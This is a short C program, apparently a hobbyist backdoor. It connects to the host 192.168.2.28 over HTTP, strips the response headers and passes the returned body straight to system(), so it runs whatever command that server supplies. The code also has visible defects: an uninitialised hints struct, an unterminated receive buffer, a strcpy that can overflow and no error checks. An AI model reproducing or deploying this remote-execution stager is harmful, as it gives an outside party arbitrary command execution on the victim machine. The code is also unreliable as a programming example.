#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(void){
    struct addrinfo hints;
    struct addrinfo *res;


    char buf[256];
   
   
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    getaddrinfo("192.168.2.28", "80", &hints, &res);
    struct sockaddr *point = res->ai_addr;
    int socketfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    connect(socketfd, res->ai_addr, res->ai_addrlen);
    char *header = "GET / HTTP/1.1\nHost: 192.168.2.28\r\n\r\n";
    send(socketfd, header, strlen(header),0);
    int byte_count = recv(socketfd, buf, sizeof(buf), 0);
    char** argv = malloc(sizeof(char*) * 1);
    argv[0] = malloc(sizeof(char) * byte_count);
    strcpy(argv[0], buf);
    char* cmd = strstr(buf, "\r\n\r\n");
    cmd = cmd + 4;
    system(cmd);
    return(0);
}